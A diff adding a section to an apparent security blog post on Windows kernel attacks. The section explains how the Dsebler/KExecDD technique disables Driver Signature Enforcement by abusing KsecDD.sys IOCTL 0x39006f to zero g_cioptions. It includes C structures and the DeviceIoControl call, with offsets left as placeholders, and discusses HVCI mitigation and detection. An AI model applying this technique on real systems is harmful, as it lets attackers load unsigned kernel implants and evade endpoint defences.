@@ -244,6 +244,10 @@ The operational constraint: all three signals fire before EDR termination, but o
   - [HVCI Extraction from a Target Environment](#hvci-extraction-from-a-target-environment-red-team-context)
   - [Scoring a Candidate: The Five-Point Checklist](#scoring-a-candidate-the-five-point-checklist)
   - [WDAC and LOLDrivers-Based Prevention](#wdac-and-loldrivers-based-prevention)
+- [DSE: The Gatekeeper and Its Bypass](#dse-the-gatekeeper-and-its-bypass)
+  - [DSE Internals: g\_cioptions and CI.dll](#dse-internals-g_cioptions-and-cidll)
+  - [The Dsebler Technique: KsecDD.sys as a Write Gadget](#the-dsebler-technique-ksecddyss-as-a-write-gadget)
+  - [BYOVD vs. DSE Bypass: Two Paths to Ring 0](#byovd-vs-dse-bypass-two-paths-to-ring-0)
 - [BYOVD in Ransomware Operations](#byovd-in-ransomware-operations)
 - [References and Open-Source Research](#references-and-open-source-research)
 
@@ -1283,6 +1287,126 @@ Deploy the LOLDrivers community WDAC deny policy alongside Microsoft's built-in 
 
 ---
 
+## DSE: The Gatekeeper and Its Bypass
+
+BYOVD's defining property is that it does not touch Driver Signature Enforcement. A legitimately signed driver complies with the enforcement policy and the kernel loads it without complaint. There is, however, a second and more aggressive technique: disable DSE entirely, enabling an attacker to load any unsigned driver including a custom kernel implant. Understanding both approaches clarifies why BYOVD is operationally preferred when a signed carrier is available, and when DSE bypass becomes necessary.
+
+### DSE Internals: g_cioptions and CI.dll
+
+Driver Signature Enforcement lives inside `CI.dll` (Code Integrity), the Windows component that verifies Authenticode signatures at driver load time. When `ntoskrnl.exe` processes a `NtLoadDriver` call, it invokes `CI.dll` verification routines (`SeValidateImageHeader` and related functions). A failed check returns `STATUS_INVALID_IMAGE_HASH` and the driver load is aborted before a single byte of driver code executes.
+
+The enforcement state is governed by a single flag inside `CI.dll`: **`g_cioptions`**. Its effective values control the strictness of enforcement:
+
+| `g_cioptions` | Enforcement state |
+|---|---|
+| `0x00` | Disabled. Any driver, signed or unsigned, loads freely. |
+| `0x06` | Standard enforcement. Valid Authenticode chain required. |
+| `0x08`+ (HVCI) | Strict. Hypervisor validates in VTL1 before the kernel maps the image. |
+
+Writing a single zero to `&g_cioptions` neutralises DSE for the lifetime of the current boot. This is the kernel patch that tools like the older **DSEFix** relied upon, and the same write that Lazarus Group performed via `dell_bios.sys` in 2022 (see threat actor table above) before loading a custom unsigned backdoor driver. Three common paths to this write exist in practice:
+
+1. **Physical memory mapping** via a driver that imports `MmMapIoSpace`: map the physical page containing `g_cioptions` and patch it directly. Used by early DSEFix variants.
+2. **Arbitrary virtual write** via a BYOVD carrier importing `ZwWriteVirtualMemory` or equivalent: load a signed carrier, use its primitive to overwrite `g_cioptions` in kernel virtual address space, then optionally unload the carrier.
+3. **Kernel function call gadget** via KsecDD.sys: the KExecDD technique, reimplemented by Dsebler. No third-party carrier required.
+
+### The Dsebler Technique: KsecDD.sys as a Write Gadget
+
+[Dsebler](https://github.com/lem0nSec/Dsebler) by lem0nSec is a C reimplementation of the KExecDD technique. Unlike third-party BYOVD carriers, it exploits **KsecDD.sys**, a legitimate Microsoft driver shipped with every Windows installation. KsecDD.sys is the kernel counterpart to LSASS for cryptographic operations; it exposes an IPC channel that LSASS uses for key material exchange.
+
+The exploit path centres on a vulnerable IOCTL handler at **`0x39006f`**. When a crafted 16-byte input structure is passed to this handler, it triggers the following internal call chain:
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">dsebler_chain — KsecDD.sys › CI.dll :: g_cioptions = 0</span>
+  </div>
+  <div style="font-family:'Courier New',monospace;font-size:12.5px;line-height:2.0;">
+
+    <div style="background:#0d1117;padding:12px 22px 14px;border-bottom:1px solid #21262d;">
+      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 3 · User Mode</div>
+      <div><span style="color:#8b949e;">CreateFile(</span><span style="color:#17fe33;">"\\.\KsecDD"</span><span style="color:#8b949e;">) </span><span style="color:#484f58;">→ </span><span style="color:#60a5fa;">hDevice</span></div>
+      <div><span style="color:#484f58;">// build outer IPC_SET_FUNCTION_RETURN_PARAMETER (16 bytes)</span></div>
+      <div><span style="color:#60a5fa;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hDevice</span><span style="color:#8b949e;">,&nbsp;</span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;">, &amp;outerParam, 16, NULL, 0, &amp;n, NULL)</span></div>
+    </div>
+
+    <div style="background:#161b22;text-align:center;padding:7px 0;color:#f97316;font-size:11px;letter-spacing:1px;border-top:1px dashed #30363d;border-bottom:1px dashed #30363d;">
+      ▼&nbsp;&nbsp;IRP crosses Ring 3 → Ring 0 boundary&nbsp;&nbsp;▼
+    </div>
+
+    <div style="background:#0d1117;padding:12px 22px 16px;border-bottom:1px solid #21262d;">
+      <div style="color:#484f58;font-size:10px;text-transform:uppercase;letter-spacing:2px;margin-bottom:10px;">Ring 0 · Kernel Mode · KsecDD.sys (Microsoft-signed)</div>
+      <div><span style="color:#8b949e;">IOCTL </span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;"> → </span><span style="color:#a78bfa;">KsecFastIoDeviceControl</span></div>
+      <div style="margin-left:22px;"><span style="color:#484f58;">└─► </span><span style="color:#fbbf24;">KsecIoctlHandleFunctionReturn</span><span style="color:#8b949e;">(outerParam)</span></div>
+      <div style="margin-left:46px;"><span style="color:#484f58;">└─► </span><span style="color:#fbbf24;">CallInProgressCompleted</span><span style="color:#8b949e;">(innerParam)</span></div>
+      <div style="margin-left:70px;"><span style="color:#484f58;">└─► </span><span style="color:#ef4444;">rip = GadgetAddress</span><span style="color:#484f58;">&nbsp;&nbsp;; executes: </span><span style="color:#17fe33;">mov [rcx], rdx</span></div>
+      <div style="margin-left:94px;"><span style="color:#484f58;">rcx = </span><span style="color:#f97316;">&amp;g_cioptions</span><span style="color:#484f58;">&nbsp;&nbsp;; target in CI.dll (build-specific offset)</span></div>
+      <div style="margin-left:94px;"><span style="color:#484f58;">rdx = </span><span style="color:#60a5fa;">0x00000000</span><span style="color:#484f58;">&nbsp;&nbsp;&nbsp;; value to write — disables enforcement</span></div>
+    </div>
+
+    <div style="background:#160b0b;padding:12px 22px 14px;border-top:2px solid #7f1d1d;">
+      <div style="color:#ef4444;font-weight:600;margin-bottom:8px;">◼ CI.dll :: g_cioptions = 0x00 — DSE disabled for this boot</div>
+      <div style="display:flex;gap:28px;flex-wrap:wrap;">
+        <span style="color:#6b7280;font-size:11px;">✓ Unsigned drivers now load</span>
+        <span style="color:#6b7280;font-size:11px;">✓ Custom kernel implants viable</span>
+        <span style="color:#6b7280;font-size:11px;">✗ No EID 6 for KsecDD (already loaded at boot)</span>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+Two nested 16-byte IPC structures control the exploit. The outer structure holds a pointer to the inner structure and the `rdx` value to write. The inner structure holds the gadget address (loaded into `rip` by `CallInProgressCompleted`) and the `rcx` parameter (the address of `g_cioptions`):
+
+<div class="ghidra-mock" style="overflow-x:auto;">
+  <div class="gm-bar">
+    <span style="color:#ff5f56">●</span>&nbsp;<span style="color:#ffbd2e">●</span>&nbsp;<span style="color:#27c93f">●</span>
+    <span style="margin-left:12px;color:#8b949e;font-size:11px;font-family:'Courier New',monospace;">dsebler_structs.c — IPC structures for IOCTL 0x39006f</span>
+  </div>
+  <div style="padding:16px 22px 18px;font-family:'Courier New',monospace;font-size:12.5px;line-height:1.9;">
+    <div><span style="color:#484f58;">// Inner structure: gadget address + rcx target (16 bytes)</span></div>
+    <div><span style="color:#60a5fa;">typedef struct </span><span style="color:#a78bfa;">_IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;"> {</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> GadgetAddress;</span><span style="color:#484f58;">  // loaded into rip: executes mov [rcx], rdx</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> RcxParameter;</span><span style="color:#484f58;">  // target address: &amp;g_cioptions in CI.dll</span></div>
+    <div><span style="color:#8b949e;">} IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER;</span></div>
+    <div style="margin-top:8px;"><span style="color:#484f58;">// Outer structure: ptr to inner + rdx value (16 bytes)</span></div>
+    <div><span style="color:#60a5fa;">typedef struct </span><span style="color:#a78bfa;">_IPC_SET_FUNCTION_RETURN_PARAMETER</span><span style="color:#8b949e;"> {</span></div>
+    <div style="margin-left:20px;"><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;">* pDeep;</span></div>
+    <div style="margin-left:20px;"><span style="color:#60a5fa;">PVOID</span><span style="color:#8b949e;"> RdxValue;</span><span style="color:#484f58;">     // 0 = disable DSE · non-zero = re-enable</span></div>
+    <div><span style="color:#8b949e;">} IPC_SET_FUNCTION_RETURN_PARAMETER;</span></div>
+    <div style="margin-top:12px;padding-top:12px;border-top:1px solid #21262d;"><span style="color:#484f58;">// Disable DSE: write 0 to g_cioptions</span></div>
+    <div><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER</span><span style="color:#8b949e;"> inner = {</span></div>
+    <div style="margin-left:20px;"><span style="color:#8b949e;">.</span><span style="color:#17fe33;">GadgetAddress</span><span style="color:#8b949e;"> = (PVOID)</span><span style="color:#f97316;">GADGET_OFFSET</span><span style="color:#8b949e;">,</span><span style="color:#484f58;">  // build-specific — recalc after each OS update</span></div>
+    <div style="margin-left:20px;"><span style="color:#8b949e;">.</span><span style="color:#17fe33;">RcxParameter</span><span style="color:#8b949e;"> = (PVOID)</span><span style="color:#f97316;">G_CIOPTIONS_ADDR</span><span style="color:#8b949e;">,</span><span style="color:#484f58;"> // g_cioptions in loaded CI.dll image</span></div>
+    <div><span style="color:#8b949e;">};</span></div>
+    <div><span style="color:#a78bfa;">IPC_SET_FUNCTION_RETURN_PARAMETER</span><span style="color:#8b949e;"> outer = { &amp;inner, (PVOID)</span><span style="color:#60a5fa;">0ULL</span><span style="color:#8b949e;"> };</span></div>
+    <div style="margin-top:8px;"><span style="color:#fbbf24;">DeviceIoControl</span><span style="color:#8b949e;">(</span><span style="color:#60a5fa;">hKsecDD</span><span style="color:#8b949e;">, </span><span style="color:#f97316;">0x39006f</span><span style="color:#8b949e;">, &amp;outer, </span><span style="color:#f97316;">sizeof(outer)</span><span style="color:#8b949e;">, NULL, 0, &amp;dwReturned, NULL);</span></div>
+    <div style="margin-top:6px;"><span style="color:#484f58;">// Supported build: Windows 10 19045 · extend by recalculating offsets per CI.dll version</span></div>
+  </div>
+</div>
+
+**Why KsecDD.sys cannot be blocked:** it is a Microsoft-signed driver present on every Windows system from Vista onward. Any WDAC deny-list entry against KsecDD.sys breaks LSASS cryptographic operations, disabling BitLocker, Windows Hello, and NTLM authentication. This persistence in the trusted driver pool gives the technique a structural durability that third-party BYOVD carriers lack.
+
+**Operational constraint:** current Dsebler hardcodes the `g_cioptions` address and the ROP gadget offset for Windows 10 build 19045. Each new Windows build recompiles `CI.dll`, shifting both values. Remaining operational across patch cycles requires recalculating these offsets after each feature update.
+
+### BYOVD vs. DSE Bypass: Two Paths to Ring 0
+
+The two techniques solve different problems. BYOVD kills a running process via a kernel primitive and requires a signed carrier. DSE bypass enables loading of arbitrary unsigned code and requires a reliable kernel write. An operator choosing between them asks a simple question: is the goal to terminate a process, or to run a custom kernel implant?
+
+| | **BYOVD (DSE-compliant)** | **DSE Bypass (Dsebler / KExecDD model)** |
+|---|---|---|
+| **Driver used** | Legitimately signed third-party carrier | KsecDD.sys (built-in, Microsoft-signed) |
+| **Unsigned code loaded** | Never | Enabled once g_cioptions = 0 |
+| **Immediate effect** | Target process killed | Any unsigned driver can now load |
+| **Primary use case** | EDR termination before payload delivery | Custom kernel implant deployment |
+| **EID 6 detection signal** | Third-party driver load, SHA-256 hashable | Absent: KsecDD already loaded at boot |
+| **HVCI mitigation** | Blocked if carrier fails FORCE_INTEGRITY or W+X | Blocked: VTL1 maintains authoritative CI state; VTL0 write to g_cioptions has no effect |
+| **Build specificity** | Low (IOCTL code stable across driver versions) | High (g_cioptions + gadget offset change per build) |
+| **Operational cost** | Low (one-shot IOCTL, no patching) | High (offset maintenance, potential token impersonation) |
+
+HVCI stops both paths, but through different mechanisms. BYOVD carriers that fail the `FORCE_INTEGRITY` or W+X structural checks are rejected before the kernel maps the image. DSE bypass via `g_cioptions` overwrite is stopped because HVCI externalises the enforcement state to VTL1: writes to the VTL0 kernel copy of `g_cioptions` have no effect because the hypervisor maintains its own authoritative enforcement record in secure memory that the VTL0 kernel cannot modify. This architectural separation is why HVCI is the single control that breaks both attack classes simultaneously.
+
+---
+
 ## BYOVD in Ransomware Operations
 
 BYOVD sits squarely in Phase 4 (Defense Evasion) of the [Unified Ransomware Kill Chain](https://benjitrapp.github.io/cultures/2026-06-24-unified-ransomware-kill-chain/). Its role is to buy unobserved execution time:
@@ -1298,6 +1422,7 @@ The dwell time between driver load and EDR termination is typically under 30 sec
 ## References and Open-Source Research
 
 **Primary research and tools:**
+- **Dsebler**: [github.com/lem0nSec/Dsebler](https://github.com/lem0nSec/Dsebler) — KExecDD reimplementation; KsecDD.sys as DSE disable gadget
 - **PhantomKiller**: [github.com/redteamfortress/PhantomKiller](https://github.com/redteamfortress/PhantomKiller)
 - **NimBlackout**: [github.com/Helixo32/NimBlackout](https://github.com/Helixo32/NimBlackout)
 - **DrvEye**: [github.com/0xDbgMan/DrvEye](https://github.com/0xDbgMan/DrvEye)
